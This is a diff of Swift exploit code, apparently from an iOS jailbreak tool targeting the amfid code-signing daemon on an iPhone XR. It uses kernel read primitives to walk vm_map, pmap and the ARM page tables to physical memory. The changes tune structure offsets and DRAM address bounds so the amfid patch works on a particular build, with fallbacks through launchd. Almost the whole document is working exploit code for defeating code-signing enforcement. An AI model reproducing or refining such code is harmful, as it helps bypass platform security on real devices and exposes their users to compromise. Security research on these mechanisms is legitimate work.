@@ -198,21 +198,36 @@ final class ExpAmfidNopFinal {
         }
         
         // Read pmap (also PAC-signed)
-        let pmap = ds_kreadptr(vmMap + 0x48)
-        log("  pmap (vm_map+0x48): 0x\(String(format:"%llx", pmap))")
+        // Try offset 0x40 first (found on this build), then 0x48
+        var pmap: UInt64 = 0
+        var pmapOffset: UInt64 = 0x40
         
-        guard pmap != 0 && (pmap >> 32) > 0xFFFFFF00 else {
-            log("❌ pmap invalid — offset 0x48 may be wrong")
-            log("   Trying other offsets...")
-            for off: UInt64 in [0x40, 0x48, 0x50, 0x58, 0x60] {
-                let val = ds_kreadptr(vmMap + off)
-                if val != 0 && (val >> 32) > 0xFFFFFF00 {
-                    log("   vm_map+0x\(String(format:"%x", off)) = 0x\(String(format:"%llx", val)) ← possible pmap?")
-                }
+        let pmap40 = ds_kreadptr(vmMap + 0x40)
+        let pmap48 = ds_kreadptr(vmMap + 0x48)
+        log("  pmap candidates:")
+        log("    vm_map+0x40 = 0x\(String(format:"%llx", pmap40))")
+        log("    vm_map+0x48 = 0x\(String(format:"%llx", pmap48))")
+        
+        if pmap40 != 0 && (pmap40 >> 32) > 0xFFFFFF00 {
+            pmap = pmap40
+            pmapOffset = 0x40
+        } else if pmap48 != 0 && (pmap48 >> 32) > 0xFFFFFF00 {
+            pmap = pmap48
+            pmapOffset = 0x48
+        }
+        
+        guard pmap != 0 else {
+            log("❌ pmap not found at +0x40 or +0x48")
+            // The value at +0x48 (0x6bab638000) might be ttep directly!
+            let rawAt48 = ds_kread64(vmMap + 0x48)
+            if rawAt48 > 0x800000000 || (rawAt48 > 0x600000000 && rawAt48 < 0xA00000000) {
+                log("  ℹ️ vm_map+0x48 raw = 0x\(String(format:"%llx", rawAt48)) — might be ttep directly!")
+                log("  Trying pmap at +0x40, ttep from pmap...")
             }
             performPatchViaLaunchd(amfidPid: amfidPid)
             return
         }
+        log("  ✅ pmap (vm_map+0x\(String(format:"%x", pmapOffset))): 0x\(String(format:"%llx", pmap))")
         
         // Read ttep (pmap+0x0 is tte on most builds)
         let ttep = ds_kread64(pmap + 0x0)
@@ -222,13 +237,14 @@ final class ExpAmfidNopFinal {
         let textBase = ds_kread64(vmMap + 0x10)
         log("  text base (vm_map+0x10): 0x\(String(format:"%llx", textBase))")
         
-        // Validate all values before proceeding
-        let ttepValid = ttep > 0x800000000 && ttep < 0x900000000
+        // Validate — ttep should be a physical address (page-aligned)
+        // iPhone XR (A12) DRAM range varies — accept 0x100000000 to 0xA00000000
+        let ttepValid = ttep != 0 && ttep > 0x100000000 && ttep < 0xA00000000 && (ttep & 0xFFF) == 0
         let textValid = textBase >= 0x100000000 && textBase < 0x280000000000
         
         log("")
         log("  Validation:")
-        log("    ttep in DRAM: \(ttepValid ? "✅" : "❌")")
+        log("    ttep physical (page-aligned): \(ttepValid ? "✅" : "❌")")
         log("    text in userspace: \(textValid ? "✅" : "❌")")
         
         guard ttepValid && textValid else {
@@ -525,11 +541,13 @@ final class ExpAmfidNopFinal {
         }
         log("  vm_map: 0x\(String(format:"%llx", vmMap))")
         
-        // vm_map → pmap (use ds_kreadptr)
-        let pmap = ds_kreadptr(vmMap + 0x48)
+        // vm_map → pmap (use ds_kreadptr, try offset 0x40 first then 0x48)
+        var pmap = ds_kreadptr(vmMap + 0x40)
+        if pmap == 0 || (pmap >> 32) <= 0xFFFFFF00 {
+            pmap = ds_kreadptr(vmMap + 0x48)
+        }
         guard pmap != 0 && (pmap >> 32) > 0xFFFFFF00 else {
-            log("❌ pmap invalid: 0x\(String(format:"%llx", pmap))")
-            log("   vm_map+0x48 may be wrong offset for this build")
+            log("❌ pmap invalid at +0x40 and +0x48")
             fallbackToLaunchd(amfidPid: amfidPid)
             return
         }
@@ -537,10 +555,9 @@ final class ExpAmfidNopFinal {
         
         // pmap → ttep (translation table entry pointer, offset 0x0)
         let ttep = ds_kread64(pmap + 0x0)
-        guard ttep != 0 && ttep > 0x800000000 && ttep < 0x900000000 else {
-            log("❌ ttep out of DRAM range: 0x\(String(format:"%llx", ttep))")
-            log("   Expected physical address in 0x800000000-0x900000000")
-            log("   pmap+0x0 may not be ttep on this build")
+        guard ttep != 0 && ttep > 0x100000000 && ttep < 0xA00000000 && (ttep & 0xFFF) == 0 else {
+            log("❌ ttep invalid: 0x\(String(format:"%llx", ttep))")
+            log("   Expected page-aligned physical address")
             fallbackToLaunchd(amfidPid: amfidPid)
             return
         }
@@ -568,7 +585,7 @@ final class ExpAmfidNopFinal {
         
         // L1 — read from physical memory (ttep is physical)
         let l1Addr = ttep + l1Idx * 8
-        guard l1Addr > 0x800000000 && l1Addr < 0x900000000 else {
+        guard l1Addr > 0x100000000 && l1Addr < 0xA00000000 else {
             log("❌ L1 addr out of range: 0x\(String(format:"%llx", l1Addr))")
             fallbackToLaunchd(amfidPid: amfidPid)
             return
@@ -584,7 +601,7 @@ final class ExpAmfidNopFinal {
         
         // L2
         let l2Addr = l2Table + l2Idx * 8
-        guard l2Addr > 0x800000000 && l2Addr < 0x900000000 else {
+        guard l2Addr > 0x100000000 && l2Addr < 0xA00000000 else {
             log("❌ L2 addr out of range: 0x\(String(format:"%llx", l2Addr))")
             fallbackToLaunchd(amfidPid: amfidPid)
             return
@@ -600,7 +617,7 @@ final class ExpAmfidNopFinal {
         
         // L3
         let l3Addr = l3Table + l3Idx * 8
-        guard l3Addr > 0x800000000 && l3Addr < 0x900000000 else {
+        guard l3Addr > 0x100000000 && l3Addr < 0xA00000000 else {
             log("❌ L3 addr out of range: 0x\(String(format:"%llx", l3Addr))")
             fallbackToLaunchd(amfidPid: amfidPid)
             return
@@ -617,7 +634,7 @@ final class ExpAmfidNopFinal {
         log("  physical: 0x\(String(format:"%llx", physAddr))")
         
         // SAFETY CHECK: verify physical address is in DRAM
-        guard physAddr > 0x800000000 && physAddr < 0x900000000 else {
+        guard physAddr > 0x100000000 && physAddr < 0xA00000000 else {
             log("❌ Physical address out of DRAM range!")
             log("   ABORTING — would cause panic")
             fallbackToLaunchd(amfidPid: amfidPid)
